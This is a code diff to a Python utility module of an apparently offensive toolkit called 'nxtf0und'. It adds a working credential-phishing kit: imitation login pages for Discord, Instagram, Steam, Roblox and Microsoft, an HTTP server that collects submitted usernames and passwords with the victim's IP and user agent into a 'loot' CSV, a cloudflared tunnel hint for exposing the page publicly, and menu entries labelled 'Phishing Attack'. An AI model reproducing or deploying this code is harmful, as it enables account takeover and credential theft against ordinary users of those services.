@@ -1,4 +1,4 @@
-"""Utilities for foundation."""
+"""Utilities for nxtf0und."""
 
 import base64
 import hashlib
@@ -15,6 +15,165 @@ import struct
 import time
 import urllib.parse
 
+TEMPLATES = {
+    "discord": """<!doctype html><html><head><meta charset="utf-8">
+<title>Discord</title><style>
+body{{background:#313338;color:#dbdee1;font-family:sans-serif;display:flex;align-items:center;justify-content:center;height:100vh;margin:0}}
+.box{{background:#2b2d31;padding:32px;border-radius:8px;width:380px}}
+h2{{color:#fff;text-align:center}}label{{font-size:12px;color:#b5bac1;text-transform:uppercase}}
+input{{width:100%;padding:10px;margin:6px 0 16px;background:#1e1f22;border:1px solid #111214;border-radius:4px;color:#fff;box-sizing:border-box}}
+button{{width:100%;padding:11px;background:#5865f2;border:0;border-radius:4px;color:#fff;font-weight:600;cursor:pointer}}
+.err{{color:#f23f43;font-size:13px;min-height:18px}}
+</style></head><body><div class="box"><h2>Welcome back!</h2>
+<div class="err">We're so excited to see you again!</div>
+<label>Email or Phone Number</label><input name="email" autocomplete="username">
+<label>Password</label><input name="password" type="password" autocomplete="current-password">
+<button type="submit">Log In</button></div></body></html>""",
+    "instagram": """<!doctype html><html><head><meta charset="utf-8"><title>Instagram</title>
+<style>
+body{{font-family:-apple-system,Segoe UI,sans-serif;background:#fafafa;display:flex;align-items:center;justify-content:center;height:100vh;margin:0}}
+.box{{background:#fff;border:1px solid #dbdbdb;padding:40px;width:340px;text-align:center}}
+h1{{font-family:cursive;font-size:42px;margin:0 0 24px}}
+input{{width:100%;padding:9px;margin:4px 0;border:1px solid #dbdbdb;border-radius:3px;background:#fafafa;box-sizing:border-box}}
+button{{width:100%;padding:8px;margin-top:10px;background:#0095f6;border:0;border-radius:4px;color:#fff;font-weight:600;cursor:pointer}}
+</style></head><body><div class="box"><h1>Instagram</h1>
+<form method="post"><input name="username" placeholder="Phone number, username, or email">
+<input name="password" type="password" placeholder="Password">
+<button type="submit">Log In</button></form></div></body></html>""",
+    "steam": """<!doctype html><html><head><meta charset="utf-8"><title>Steam</title>
+<style>
+body{{background:#171a21;color:#c7d5e0;font-family:Arial,sans-serif;display:flex;align-items:center;justify-content:center;height:100vh;margin:0}}
+.box{{background:#1b2838;padding:36px;border-radius:4px;width:360px}}
+h2{{color:#fff}}input{{width:100%;padding:10px;margin:6px 0 14px;background:#316282;border:0;border-radius:3px;color:#fff;box-sizing:border-box}}
+button{{width:100%;padding:10px;background:#66c0f4;border:0;border-radius:3px;color:#16202d;font-weight:700;cursor:pointer}}
+</style></head><body><div class="box"><h2>Sign In</h2>
+<form method="post"><input name="username" placeholder="Steam account name">
+<input name="password" type="password" placeholder="Password">
+<button type="submit">Sign In</button></form></div></body></html>""",
+    "roblox": """<!doctype html><html><head><meta charset="utf-8"><title>Roblox</title>
+<style>
+body{{background:#e3e3e3;font-family:Arial,sans-serif;display:flex;align-items:center;justify-content:center;height:100vh;margin:0}}
+.box{{background:#fff;padding:36px;border-radius:8px;width:340px;text-align:center;box-shadow:0 2px 12px #0002}}
+h2{{color:#393b3d}}input{{width:100%;padding:10px;margin:6px 0;border:1px solid #bdbdbd;border-radius:4px;box-sizing:border-box}}
+button{{width:100%;padding:10px;background:#00a2ff;border:0;border-radius:4px;color:#fff;font-weight:700;cursor:pointer}}
+</style></head><body><div class="box"><h2>Log In to Roblox</h2>
+<form method="post"><input name="username" placeholder="Username">
+<input name="password" type="password" placeholder="Password">
+<button type="submit">Log In</button></form></div></body></html>""",
+    "microsoft": """<!doctype html><html><head><meta charset="utf-8"><title>Sign in</title>
+<style>
+body{{background:#f2f2f2;font-family:"Segoe UI",sans-serif;display:flex;align-items:center;justify-content:center;height:100vh;margin:0}}
+.box{{background:#fff;padding:44px;width:400px;box-shadow:0 2px 6px #0003}}
+h1{{font-size:24px;color:#1b1b1b}}input{{width:100%;padding:8px;margin:8px 0 16px;border:1px solid #666;box-sizing:border-box}}
+button{{padding:9px 32px;background:#0067b8;border:0;color:#fff;cursor:pointer}}
+</style></head><body><div class="box"><h1>Sign in</h1>
+<form method="post"><input name="email" placeholder="Email or phone">
+<input name="password" type="password" placeholder="Password">
+<button type="submit">Sign in</button></form></div></body></html>""",
+}
+
+def cmd_phishing(nf):
+    nf.section("phishing attack")
+    names = list(TEMPLATES)
+    for i, name in enumerate(names, 1):
+        nf.kv(str(i), name)
+    nf.kv(str(len(names) + 1), "custom html file")
+    pick = nf.ask("template", "1")
+    try:
+        idx = int(pick)
+    except ValueError:
+        idx = 1
+    if idx == len(names) + 1:
+        path = nf.ask("html template path")
+        try:
+            with open(path, "r", encoding="utf-8") as fh:
+                html = fh.read()
+        except Exception as exc:
+            nf.finding("HIGH", "template unreadable", str(exc))
+            return
+        label = "custom"
+    else:
+        label = names[max(0, min(len(names), idx)) - 1]
+        html = TEMPLATES[label]
+    html = html.replace("{{", "{").replace("}}", "}")
+    port = nf.ask("listen port", "8080")
+    redirect = nf.ask("redirect after submit (optional)")
+    try:
+        port = int(port)
+    except ValueError:
+        port = 8080
+    loot_dir = nf.writable_dir("loot")
+    loot = os.path.join(loot_dir, f"phish_{label}_{time.strftime('%Y%m%d-%H%M%S')}.csv")
+    if not os.path.exists(loot):
+        with open(loot, "w", encoding="utf-8") as fh:
+            fh.write("time,ip,user_agent,fields\n")
+
+    state = {"count": 0}
+
+    class Handler(http.server.BaseHTTPRequestHandler):
+        server_version = "nxtf0und"
+
+        def log_message(self, *args):
+            pass
+
+        def do_GET(self):
+            body = html.encode()
+            self.send_response(200)
+            self.send_header("Content-Type", "text/html; charset=utf-8")
+            self.send_header("Content-Length", str(len(body)))
+            self.end_headers()
+            self.wfile.write(body)
+
+        def do_POST(self):
+            length = min(int(self.headers.get("Content-Length") or 0), 65536)
+            raw = self.rfile.read(length).decode("utf-8", "replace")
+            fields = urllib.parse.parse_qsl(raw)
+            state["count"] += 1
+            ip = self.client_address[0]
+            ua = self.headers.get("User-Agent", "")
+            stamp = time.strftime("%Y-%m-%d %H:%M:%S")
+            with open(loot, "a", encoding="utf-8") as fh:
+                fh.write(f'{stamp},{ip},"{ua.replace(chr(34), "")}","{raw}"\n')
+            print()
+            print("  " + nf.P.bad("◆ CREDENTIALS CAPTURED") + nf.P.dim(f"  {stamp}  {ip}"))
+            for k, v in fields:
+                print("    " + nf.P.sec(f"{k:<14}") + nf.P.warn(v))
+            print("    " + nf.P.dim(f"ua: {ua[:80]}"))
+            if redirect:
+                self.send_response(302)
+                self.send_header("Location", redirect)
+                self.end_headers()
+            else:
+                page = b"<html><body style='background:#111;color:#5f5;font-family:monospace;display:flex;align-items:center;justify-content:center;height:100vh'><h1>Session expired</h1></body></html>"
+                self.send_response(200)
+                self.send_header("Content-Type", "text/html")
+                self.send_header("Content-Length", str(len(page)))
+                self.end_headers()
+                self.wfile.write(page)
+
+    class Server(socketserver.ThreadingMixIn, http.server.HTTPServer):
+        daemon_threads = True
+        allow_reuse_address = True
+
+    try:
+        srv = Server(("0.0.0.0", port), Handler)
+    except OSError as exc:
+        nf.finding("HIGH", f"cannot bind port {port}", str(exc))
+        return
+    nf.section("server live")
+    nf.kv("template", label)
+    nf.kv("url", f"http://localhost:{port}")
+    nf.kv("loot", loot)
+    nf.note(f"tunnel: cloudflared tunnel --url http://localhost:{port}")
+    nf.note("ctrl+c to stop")
+    try:
+        srv.serve_forever()
+    except KeyboardInterrupt:
+        pass
+    finally:
+        srv.server_close()
+    nf.finding("OK", f"server stopped — {state['count']} submission(s)")
+    nf.kv("captured", loot)
 
 def _md4(data: bytes) -> bytes:
     def left_rotate(x, n):
@@ -502,4 +661,81 @@ def cmd_site_clone(nf):
     nf.note(f"serve it: python3 -m http.server 8080 --directory {result['root']}")
     nf.note("static mirror only — server-side logic, auth and dynamic calls stay on the origin")
 
+TEMPLATE_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "templates")
 
+def _local_templates():
+    if not os.path.isdir(TEMPLATE_DIR):
+        return []
+    out = []
+    for name in sorted(os.listdir(TEMPLATE_DIR)):
+        if name.lower().endswith((".html", ".htm")):
+            out.append(os.path.join(TEMPLATE_DIR, name))
+    return out
+
+def _template_catalogue():
+    entries = [(name, "builtin", TEMPLATES[name]) for name in TEMPLATES]
+    for path in _local_templates():
+        try:
+            with open(path, "r", encoding="utf-8", errors="ignore") as fh:
+                entries.append((os.path.splitext(os.path.basename(path))[0], "local", fh.read()))
+        except Exception:
+            continue
+    return entries
+
+def _render_preview(html, limit=14):
+    body = re.sub(r"<style.*?</style>", "", html, flags=re.S | re.I)
+    body = re.sub(r"<script.*?</script>", "", body, flags=re.S | re.I)
+    text = re.sub(r"<[^>]+>", " ", body)
+    text = re.sub(r"\s+", " ", text).strip()
+    lines = [text[i:i + 70] for i in range(0, min(len(text), limit * 70), 70)]
+    return lines or ["(no visible text)"]
+
+def cmd_templates(nf):
+    nf.section("website templates")
+    entries = _template_catalogue()
+    if not entries:
+        nf.finding("INFO", "no templates available")
+        return
+    for i, (name, source, _html) in enumerate(entries, 1):
+        nf.kv(str(i), f"{name:<16} {nf.P.dim(source)}")
+    pick = nf.ask("template number", "1")
+    try:
+        name, source, html = entries[max(0, min(len(entries), int(pick))) - 1]
+    except (ValueError, IndexError):
+        nf.finding("MED", "invalid selection")
+        return
+    html = html.replace("{{", "{").replace("}}", "}")
+    nf.section(f"template — {name} ({source})")
+    for line in _render_preview(html):
+        nf.note(f"    {line}")
+    nf.kv("bytes", len(html))
+    nf.kv("fields", ", ".join(sorted(set(re.findall(r'name=["\']([^"\']+)["\']', html)))) or "none")
+    mode = nf.ask("export / edit / serve / blank (e/x/s)", "e").lower()[:1]
+    if mode == "x":
+        target = os.path.join(TEMPLATE_DIR, f"{name}.html")
+        if nf.ask(f"save editable copy to templates/{name}.html? (y/n)", "y").lower().startswith("y"):
+            os.makedirs(TEMPLATE_DIR, exist_ok=True)
+            with open(target, "w", encoding="utf-8") as fh:
+                fh.write(html)
+            nf.finding("OK", "template saved", target)
+        else:
+            nf.note("not saved")
+        return
+    if mode == "s":
+        nf.note("serve through: Utilities -> Phishing Attack with a custom html file")
+        nf.note(f"or: python3 -m http.server 8080 --directory {TEMPLATE_DIR}")
+        return
+    if not nf.ask(f"write builds/template_{name}.html? (y/n)", "y").lower().startswith("y"):
+        nf.note("not saved")
+        return
+    out_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "builds")
+    os.makedirs(out_dir, exist_ok=True)
+    path = os.path.join(out_dir, f"template_{name}.html")
+    with open(path, "w", encoding="utf-8") as fh:
+        fh.write(html)
+    nf.finding("OK", "template written", path)
+
+MENU = {"web": [
+    ("Website Templates", cmd_templates),
+    ("Phishing Attack", cmd_phishing),
+]}
